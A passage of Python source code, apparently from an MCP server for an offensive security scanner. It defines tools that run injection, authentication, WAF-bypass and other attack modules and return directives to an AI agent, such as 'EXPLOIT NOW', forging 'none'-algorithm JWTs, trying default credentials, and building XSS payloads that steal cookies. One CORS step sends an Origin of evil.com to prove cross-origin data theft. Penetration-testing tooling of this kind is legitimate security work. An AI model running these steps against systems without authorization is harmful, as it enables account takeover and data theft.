    next_steps.append("ELITE [MANDATORY]: Run scan_subdomain_takeover on all discovered subdomains.")

    return {
        "results": results,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "warning": warning,
        "next_steps": next_steps,
    }


@mcp.tool()
async def recon_api_discovery(session_id: str, api_type: str | None = None) -> dict[str, Any]:
    """API-specific reconnaissance: find OpenAPI/Swagger specs, GraphQL endpoints,
    gRPC reflection, enumerate API routes from JavaScript, sitemap, robots.txt."""
    session = _require_session(session_id)

    from pencheff.modules.api.rest_discovery import RestDiscoveryModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    results: dict[str, Any] = {"api_specs": [], "graphql_endpoints": [], "endpoints_found": 0}

    try:
        discovery = RestDiscoveryModule()
        findings = await discovery.run(session, http, config={"api_type": api_type})
        session.findings.add_many(findings)
        results["api_specs"] = session.discovered.api_specs
        results["endpoints_found"] = len(session.discovered.endpoints)
    finally:
        await http.close()

    session.discovered.completed_modules.append("recon_api_discovery")

    next_steps = []
    if session.discovered.api_specs:
        next_steps.append("API specs found. Run scan_api for thorough API vulnerability testing.")
    next_steps.append("Run scan_injection on discovered API endpoints.")

    return {
        "results": results,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


# ─── Vulnerability Scanning ───────────────────────────────────────────


@mcp.tool()
async def scan_injection(
    session_id: str,
    types: list[str] | None = None,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
    """Test for injection vulnerabilities: SQL injection (error/blind/time-based),
    NoSQL injection, OS command injection, SSTI, XXE, SSRF, LDAP injection,
    second-order injection, open redirect, and HTTP header injection.
    Targets discovered endpoints or specific ones provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_injection"

    from pencheff.modules.injection.sqli import SQLiModule
    from pencheff.modules.injection.nosqli import NoSQLiModule
    from pencheff.modules.injection.cmdi import CommandInjectionModule
    from pencheff.modules.injection.ssti import SSTIModule
    from pencheff.modules.injection.xxe import XXEModule
    from pencheff.modules.injection.ssrf import SSRFModule
    from pencheff.modules.injection.ldap import LDAPInjectionModule
    from pencheff.modules.injection.second_order import SecondOrderInjectionModule
    from pencheff.modules.injection.open_redirect import OpenRedirectModule
    from pencheff.modules.injection.header_injection import HeaderInjectionModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "sqli": SQLiModule,
        "nosqli": NoSQLiModule,
        "cmdi": CommandInjectionModule,
        "ssti": SSTIModule,
        "xxe": XXEModule,
        "ssrf": SSRFModule,
        "ldap": LDAPInjectionModule,
        "second_order": SecondOrderInjectionModule,
        "open_redirect": OpenRedirectModule,
        "header_injection": HeaderInjectionModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []
    stats = {"tests_run": 0, "modules_run": []}

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http, targets=endpoints)
                all_findings.extend(findings)
                stats["modules_run"].append(name)
                stats["tests_run"] += len(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_injection")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Review {new_count} injection findings. Use get_findings(category='injection') then test_endpoint only for non-destructive confirmation.")
        next_steps.append("For SQLi: the workflow now uses Pencheff's first-party SQLi probe with safe error, boolean, time, UNION-shape, and stacked-query detection.")
        next_steps.append("For SSRF/SSTI/CMDi: prefer harmless proof payloads and document impact without accessing secrets or executing destructive actions.")
    else:
        next_steps.append("No injection findings from automated scan. Try MANUAL testing with test_endpoint — craft custom payloads for each parameter.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling, cache poisoning, deserialization, prototype pollution.")
    next_steps.append("ELITE [MANDATORY]: Run scan_waf if not done — fingerprint defenses, generate bypass payloads.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "stats": stats,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_auth(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test authentication mechanisms: session management flaws, JWT attacks
    (none algorithm, key confusion), OAuth/SAML misconfigurations, MFA bypass,
    credential stuffing resistance, password policy."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_auth"

    from pencheff.modules.auth.session_mgmt import SessionManagementModule
    from pencheff.modules.auth.jwt_attacks import JWTAttackModule
    from pencheff.modules.auth.brute_force import BruteForceModule
    from pencheff.modules.auth.password_policy import PasswordPolicyModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "session": SessionManagementModule,
        "jwt": JWTAttackModule,
        "brute_force": BruteForceModule,
        "password_policy": PasswordPolicyModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_auth")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"EXPLOIT NOW: {new_count} auth findings. Use test_endpoint to demonstrate account takeover:")
        next_steps.append("For JWT issues: use test_endpoint to forge a JWT with 'none' algorithm or HS256 key confusion and access admin endpoints.")
        next_steps.append("For session flaws: use test_endpoint to demonstrate session fixation or prediction.")
        next_steps.append("Try default credentials with test_endpoint: admin/admin, admin/password, test/test, root/root.")
    else:
        next_steps.append("MANUAL: Try default credentials with test_endpoint (admin/admin, admin/password). Try accessing /admin directly.")
    next_steps.append("Run scan_authz for IDOR and privilege escalation testing.")
    next_steps.append("ELITE [MANDATORY]: Run scan_mfa_bypass — test 2FA bypass, OTP brute force, backup code abuse.")
    next_steps.append("ELITE [MANDATORY]: Run scan_oauth — OAuth/OIDC redirect_uri manipulation, token leakage.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling and cache poisoning complement auth attacks.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_authz(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test authorization controls: IDOR, horizontal/vertical privilege escalation,
    RBAC bypass. Best results require at least two credential sets."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_authz"

    from pencheff.modules.authz.idor import IDORModule
    from pencheff.modules.authz.privilege_esc import PrivilegeEscalationModule
    from pencheff.modules.authz.rbac_bypass import RBACBypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "idor": IDORModule,
        "privilege_escalation": PrivilegeEscalationModule,
        "rbac_bypass": RBACBypassModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_authz")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"EXPLOIT NOW: {new_count} authz findings. Use test_endpoint to demonstrate data theft:")
        next_steps.append("For IDOR: use test_endpoint to access other users' data by incrementing IDs (id=1,2,3,4,5...).")
        next_steps.append("For privilege escalation: use test_endpoint to access admin-only endpoints with regular user creds.")
    else:
        next_steps.append("MANUAL: Use test_endpoint to try IDOR — change numeric IDs in API URLs. Try accessing /admin, /api/users, /api/admin endpoints.")
    if session.credentials.count < 2:
        next_steps.append("Add a second credential set via pentest_configure for deeper authz testing.")
    next_steps.append("Run scan_business_logic for rate limiting and race condition testing.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — deserialization and prototype pollution for privilege escalation.")
    next_steps.append("ELITE [MANDATORY]: Run exploit_chain_suggest — IDOR + injection = critical chain.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_client_side(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test for client-side vulnerabilities: XSS (reflected, stored, DOM-based),
    CSRF token analysis and bypass, clickjacking."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_client_side"

    from pencheff.modules.client_side.xss import XSSModule
    from pencheff.modules.client_side.csrf import CSRFModule
    from pencheff.modules.client_side.clickjacking import ClickjackingModule
    from pencheff.modules.client_side.dom_xss import DOMXSSModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "xss": XSSModule,
        "csrf": CSRFModule,
        "clickjacking": ClickjackingModule,
        "dom_xss": DOMXSSModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_client_side")

    cs_next_steps = []
    if new_count > 0:
        cs_next_steps.append(f"EXPLOIT NOW: {new_count} client-side findings. Use test_endpoint to build working XSS PoCs:")
        cs_next_steps.append("For XSS: craft a payload that executes document.cookie theft and demonstrate it with test_endpoint.")
        cs_next_steps.append("For CSRF: build a cross-origin request PoC showing state-changing actions without tokens.")
    else:
        cs_next_steps.append("MANUAL: Use test_endpoint to inject XSS payloads into every reflected parameter you found during recon.")
    cs_next_steps.append("Run scan_api for API-specific vulnerability testing.")
    cs_next_steps.append("ELITE [MANDATORY]: Run scan_advanced — DOM-based XSS chains with prototype pollution.")
    cs_next_steps.append("ELITE [MANDATORY]: Run scan_websocket — WebSocket injection of XSS/CSRF payloads.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": cs_next_steps,
    }


@mcp.tool()
async def scan_infrastructure(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test infrastructure security: SSL/TLS configuration, security headers
    (CSP, HSTS, X-Frame-Options), CORS misconfigurations, HTTP method testing."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_infrastructure"

    from pencheff.modules.web.ssl_tls import SSLTLSModule
    from pencheff.modules.web.headers import SecurityHeadersModule
    from pencheff.modules.web.cors import CORSModule
    from pencheff.modules.web.http_methods import HTTPMethodsModule
    from pencheff.modules.web.server_scan import WebServerScanModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "web_server": WebServerScanModule,
        "ssl_tls": SSLTLSModule,
        "headers": SecurityHeadersModule,
        "cors": CORSModule,
        "http_methods": HTTPMethodsModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_infrastructure")

    infra_next_steps = []
    if new_count > 0:
        infra_next_steps.append(f"Found {new_count} infrastructure findings. Focus on EXPLOITABLE ones:")
        infra_next_steps.append("For CORS misconfig: use test_endpoint with Origin: https://evil.com AND credentials to prove cross-origin data theft.")
        infra_next_steps.append("For exposed files/default pages: verify access scope and remove or restrict anything not intentionally public.")
        infra_next_steps.append("Skip reporting missing headers unless they enable a concrete attack (e.g., missing CSP + reflected XSS = exploitable).")
    infra_next_steps.append("Run scan_injection for application-level vulnerability testing.")
    infra_next_steps.append("ELITE [MANDATORY]: Run scan_waf — infrastructure findings inform WAF fingerprinting strategy.")
    infra_next_steps.append("ELITE [MANDATORY]: Run scan_advanced — CORS misconfigs + cache poisoning = critical chain.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": infra_next_steps,
    }


@mcp.tool()
async def scan_api(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test API-specific vulnerabilities: REST parameter fuzzing, GraphQL
    introspection abuse, query depth/complexity attacks, mass assignment,
    broken object-level authorization on API endpoints."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_api"

    from pencheff.modules.api.graphql import GraphQLModule
    from pencheff.modules.api.api_fuzzer import APIFuzzerModule
    from pencheff.modules.api.mass_assignment import MassAssignmentModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "graphql": GraphQLModule,
        "fuzzer": APIFuzzerModule,
        "mass_assignment": MassAssignmentModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_api")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Run scan_business_logic for rate limiting and race conditions.",
            "ELITE [MANDATORY]: Run scan_advanced — mass assignment + HTTP smuggling = privilege escalation chain.",
            "ELITE [MANDATORY]: Run scan_subdomain_takeover on all discovered subdomains.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — correlate API findings into attack chains.",
        ],
    }


# ─── Specialized Scanning ─────────────────────────────────────────────


@mcp.tool()
async def scan_cloud(session_id: str, provider: str = "aws") -> dict[str, Any]:
    """Test cloud-specific misconfigurations: S3 bucket enumeration/permissions,
    cloud metadata service access (via SSRF), IAM policy analysis."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_cloud"

    from pencheff.modules.cloud.s3_enum import S3EnumModule
    from pencheff.modules.cloud.metadata import CloudMetadataModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        if provider in ("aws", "all"):
            s3_mod = S3EnumModule()
            all_findings.extend(await s3_mod.run(session, http))
        meta_mod = CloudMetadataModule()
        all_findings.extend(await meta_mod.run(session, http, config={"provider": provider}))
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_cloud")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Review cloud findings with get_findings category='cloud'.",
            "ELITE [MANDATORY]: Run scan_advanced — SSRF + cloud metadata = credential theft chain.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — cloud misconfigs often anchor critical chains.",
        ],
    }


@mcp.tool()
async def scan_file_handling(session_id: str) -> dict[str, Any]:
    """Test file handling vulnerabilities: upload bypass (extension, MIME type,
    magic bytes), path traversal/LFI, zip slip."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_file_handling"

    from pencheff.modules.file_handling.upload import FileUploadModule
    from pencheff.modules.file_handling.path_traversal import PathTraversalModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        upload_mod = FileUploadModule()
        all_findings.extend(await upload_mod.run(session, http))
        pt_mod = PathTraversalModule()
        all_findings.extend(await pt_mod.run(session, http))
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_file_handling")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "ELITE [MANDATORY]: Run scan_advanced — file upload + deserialization = RCE chain.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — file upload vulns drive the highest-impact chains.",
            "Run scan_business_logic for race conditions in file processing.",
        ],
    }


@mcp.tool()
async def scan_business_logic(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test business logic flaws: rate limiting adequacy, race conditions,
    multi-step workflow bypass, state/parameter manipulation."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_business_logic"

    from pencheff.modules.logic.rate_limiting import RateLimitModule
    from pencheff.modules.logic.race_condition import RaceConditionModule
    from pencheff.modules.logic.workflow_bypass import WorkflowBypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "rate_limiting": RateLimitModule,
        "race_condition": RaceConditionModule,
        "workflow_bypass": WorkflowBypassModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_business_logic")

    bl_next_steps = []
    if new_count > 0:
        bl_next_steps.append(f"EXPLOIT NOW: {new_count} business logic findings. Use test_endpoint/test_chain to demonstrate:")
        bl_next_steps.append("For race conditions: use test_chain with rapid parallel requests to prove double-spend or duplicate creation.")
        bl_next_steps.append("For rate limit bypass: demonstrate unlimited attempts with test_endpoint using X-Forwarded-For rotation.")
    else:
        bl_next_steps.append("MANUAL: Use test_chain to test race conditions — send the same purchase/transfer request in rapid succession.")
    bl_next_steps.append("ELITE [MANDATORY]: Run scan_advanced — race conditions + HTTP smuggling = desync attacks.")
    bl_next_steps.append("ELITE [MANDATORY]: Run scan_mfa_bypass + scan_websocket + scan_subdomain_takeover if not yet run.")
    bl_next_steps.append("ELITE [MANDATORY]: Run exploit_chain_suggest to chain all findings into attack narratives.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": bl_next_steps,
    }


# ─── Advanced Attack Scanning ────────────────────────────────────────


@mcp.tool()
async def scan_waf(
    session_id: str,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
    """Detect and fingerprint WAF/IPS (Cloudflare, AWS WAF, Akamai, Imperva,
    ModSecurity, F5, Fortinet, Sucuri, etc). Test bypass techniques with encoding,
    obfuscation, and case mutation. Run BEFORE injection scans — results inform
    payload selection for all other modules."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_waf"

    from pencheff.modules.advanced.waf_detection import WAFDetectionModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = WAFDetectionModule()
        findings = await mod.run(session, http, targets=endpoints)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_waf")

    waf_info = session.discovered.waf_detected
    next_steps = []
    if waf_info.get("vendor"):
        next_steps.append(f"WAF detected: {waf_info['vendor']}. Use payload_generate to create WAF-aware payloads.")
        if waf_info.get("bypass_hints"):
            next_steps.append(f"{len(waf_info['bypass_hints'])} bypass techniques succeeded — use these for injection scans.")
    next_steps.append("Run scan_injection and scan_advanced with WAF-aware strategy.")

    return {
        "waf_detected": waf_info,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_advanced(
    session_id: str,
    types: list[str] | None = None,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
    """Test advanced attack vectors: HTTP request smuggling (CL.TE, TE.CL, TE.TE,
    H2.CL), web cache poisoning/deception, insecure deserialization (Java/Python/PHP/
    .NET/YAML), prototype pollution, and DNS rebinding susceptibility."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_advanced"

    from pencheff.modules.advanced.http_smuggling import HTTPSmugglingModule
    from pencheff.modules.advanced.cache_poisoning import CachePoisoningModule
    from pencheff.modules.advanced.deserialization import DeserializationModule
    from pencheff.modules.advanced.prototype_pollution import PrototypePollutionModule
    from pencheff.modules.advanced.dns_rebinding import DNSRebindingModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "http_smuggling": HTTPSmugglingModule,
        "cache_poisoning": CachePoisoningModule,
        "deserialization": DeserializationModule,
        "prototype_pollution": PrototypePollutionModule,
        "dns_rebinding": DNSRebindingModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []
    stats = {"modules_run": []}

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http, targets=endpoints)
                all_findings.extend(findings)
                stats["modules_run"].append(name)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_advanced")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} advanced vulnerabilities. Review with get_findings.")
        next_steps.append("Use test_chain to build multi-step exploitation chains.")
    next_steps.append("Run exploit_chain_suggest to identify attack chains across all findings.")
    next_steps.append("Run scan_waf if not done — bypass techniques may unlock more findings.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "stats": stats,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_subdomain_takeover(
    session_id: str,
    subdomains: list[str] | None = None,
) -> dict[str, Any]:
    """Detect subdomain takeover vulnerabilities: dangling CNAME records pointing to
    unclaimed services (GitHub Pages, S3, Heroku, Azure, Shopify, Fastly, Netlify,
    Vercel, and 20+ more). Uses discovered subdomains if none provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_subdomain_takeover"

    from pencheff.modules.recon.subdomain_takeover import SubdomainTakeoverModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = SubdomainTakeoverModule()
        findings = await mod.run(session, http, targets=subdomains)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_subdomain_takeover")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} subdomain takeover vulnerabilities! These enable phishing, cookie theft, and CSP bypass.")
    if session.discovered.cname_records:
        next_steps.append(f"Discovered {len(session.discovered.cname_records)} CNAME records for analysis.")
    next_steps.append("Run scan_infrastructure on discovered subdomains.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "cname_records": session.discovered.cname_records[:20],
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_mobile_static(
    session_id: str,
    apk_path: str | None = None,
    ipa_path: str | None = None,
    types: list[str] | None = None,
    use_mobsf: bool = False,
) -> dict[str, Any]:
    """Static analysis of an Android APK or iOS IPA. No device or emulator required.

    For APK: decompiles with apktool (manifest) and jadx (Java source), then sweeps for
      OWASP Mobile Top 10 issues — debuggable/allowBackup/cleartext flags, exported
      components without permissions, hardcoded secrets (AWS/Google/Firebase/Stripe/JWT/PEM
      keys), insecure crypto (DES/RC4/ECB, MD5/SHA-1, hardcoded keys/IVs, java.util.Random),
      and cleartext URLs.

    For IPA: unzips and parses Info.plist for ATS bypass (NSAllowsArbitraryLoads), enumerates
      custom URL schemes (deeplink hijacking), reviews embedded.mobileprovision, and runs
      `otool -hv` (if available) to check PIE/canary flags on the Mach-O binary.

    types selects subsets: ["manifest", "secrets", "crypto", "ios"]. Default = all applicable
    to the provided file type.

    use_mobsf=True triggers a MobSF REST enrichment pass (requires MOBSF_API_KEY env var
    and a running MobSF server) on top of the first-party scan.

    Provide exactly one of apk_path or ipa_path. After this scan, use get_findings(category=
    "mobile_*") to review and run_security_tool with mobsfscan/qark/semgrep for further depth.
    Dynamic instrumentation (Frida/objection/drozer) is not part of this tool."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_mobile_static"

    from pencheff.core.http_client import PencheffHTTPClient
    from pencheff.modules.mobile.crypto import MobileCryptoModule
    from pencheff.modules.mobile.ios_static import IOSStaticModule
    from pencheff.modules.mobile.manifest import AndroidManifestModule
    from pencheff.modules.mobile.secrets import MobileSecretsModule

    if bool(apk_path) == bool(ipa_path):
        session.discovered.running_module = None
        return {
            "error": "Provide exactly one of apk_path or ipa_path.",
            "next_steps": [
                "Pass apk_path='/path/to/app.apk' for Android, or ipa_path='/path/to/app.ipa' for iOS.",
            ],
        }

    if apk_path:
        modules_map = {
            "manifest": AndroidManifestModule,
            "secrets": MobileSecretsModule,
            "crypto": MobileCryptoModule,
        }
    else:
        modules_map = {"ios": IOSStaticModule}

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []
    stats = {"modules_run": [], "files_scanned": 0}
    mod_config = {"apk_path": apk_path, "ipa_path": ipa_path}

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http, targets=None, config=mod_config)
                all_findings.extend(findings)
                stats["modules_run"].append(name)

        if use_mobsf and apk_path:
            from pencheff.modules.mobile import mobsf
            mobsf_result = await mobsf.scan(apk_path)
            if "error" not in mobsf_result:
                stats["mobsf"] = mobsf_result
            else:
                stats["mobsf_error"] = mobsf_result["error"]
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_mobile_static")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Review {new_count} mobile findings. Use get_findings(category='mobile_secrets') / 'mobile_crypto' / 'mobile_misconfig' / 'mobile_communication' to drill in.")
        next_steps.append("VERIFY: For hardcoded secrets, attempt to use the credential against the relevant service (carefully, with authorization) to demonstrate impact.")
        next_steps.append("CHAIN: Extract API hostnames from the binary, then run pentest_init + scan_injection against the backend to chain mobile-static → backend-DAST.")
        next_steps.append("DEPTH: Run run_security_tool with 'mobsfscan' or 'qark' (Android) for additional rule coverage.")
    else:
        next_steps.append("No findings from automated static scan. MANUAL: review the decompiled output (jadx -d) for business-logic flaws — auth bypass, debug menus, crypto misuse the regex sweep missed.")
    if not use_mobsf and apk_path:
        next_steps.append("ENRICH: Run scan_mobile_static again with use_mobsf=True (requires MOBSF_API_KEY and a running MobSF server) for SAST + dependency-CVE coverage.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "stats": stats,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_extension(session_id: str, extension_path: str) -> dict[str, Any]:
    """Static analysis of a browser extension (Chrome CRX, Firefox XPI, or a
    zipped unpacked extension). No browser required.

    Unpacks the package and scores: dangerous permissions (debugger, cookies,
    <all_urls>, proxy), broad host_permissions, MV2 deprecation, weak CSP
    (unsafe-eval/unsafe-inline), broad externally_connectable, content-script
    injection surface, remote-code loading, DOM sinks (eval/innerHTML/
    document.write), and hardcoded secrets. The extension is never loaded in a
    browser — pure static analysis of the bundle."""
    from pencheff.modules.client.extension import analyze_extension

    session = _require_session(session_id)
    session.discovered.running_module = "scan_extension"
    try:
        findings = await asyncio.to_thread(analyze_extension, extension_path, "extension")
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_extension")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Review extension findings: get_findings(category='extension_misconfig') / 'extension_secrets'.",
            "DEPTH: run_security_tool with 'addons-linter' (Mozilla) and 'retire.js' for bundled-library CVEs.",
        ] if new_count else ["No static findings. MANUAL: review background/content scripts for data-exfil flows."],
    }


@mcp.tool()
async def scan_desktop(session_id: str, app_path: str) -> dict[str, Any]:
    """Static analysis of a desktop application bundle (Electron, Java/JAR,
    .NET, Qt/native). No execution — the binary is never run.

    For Electron/archive bundles: extracts and flags insecure webPreferences
    (nodeIntegration, contextIsolation:false, sandbox:false, webSecurity:false),
    dangerous calls (eval, child_process, shell.openExternal), outdated Electron,
    and hardcoded secrets. For opaque native binaries (PE/ELF/Mach-O): extracts
    printable strings and sweeps for embedded secrets, with a clear note that
    decompiler-grade depth is out of scope for this pass."""
    from pencheff.modules.client.desktop import analyze_desktop

    session = _require_session(session_id)
    session.discovered.running_module = "scan_desktop"
    try:
        findings = await asyncio.to_thread(analyze_desktop, app_path, "desktop app")
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_desktop")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Review desktop findings: get_findings(category='desktop_misconfig') / 'desktop_secrets'.",
            "DEPTH: for Electron run 'electronegativity'; for JAR/.NET decompile + OWASP Dependency-Check.",
        ] if new_count else ["No static findings. MANUAL: decompile and review IPC handlers / deserialization."],
    }


@mcp.tool()
async def scan_firmware(session_id: str, firmware_path: str) -> dict[str, Any]:
    """Static analysis of a firmware / embedded / IoT / OT device image. No
    device or flashing required — the image is analyzed as data.

    Identifies embedded filesystems and components (via binwalk when present),
    then sweeps the extracted strings for embedded private keys, certificates,
    hardcoded/default OS credentials (the Mirai-class IoT compromise vector),
    telnet/debug services, cleartext update endpoints, hardcoded secrets, and
    component-version banners for CVE matching. Suits firmware for cameras,
    drones, routers, robot vacuums, and other consumer/industrial IoT. The
    firmware is never flashed or executed."""
    from pencheff.artifact_tools import _kind_config_for_session
    from pencheff.modules.client.firmware import analyze_firmware

    session = _require_session(session_id)
    # Pass the real kind so iot_device gets the Mirai default-credential pass and
    # ot_ics_scada gets ICS-protocol detection (firmware = general baseline).
    cfg = _kind_config_for_session(session_id) or {}
    kind = cfg.get("kind") or getattr(getattr(session, "target", None), "kind", None) or "firmware"
    session.discovered.running_module = "scan_firmware"
    try:
        findings = await analyze_firmware(firmware_path, kind)
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_firmware")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Review firmware findings: get_findings(category='firmware_creds') / 'firmware_crypto' / 'firmware_secrets'.",
            "DEPTH: extract the filesystem (binwalk -e) and review init scripts, web admin binaries, and update logic.",
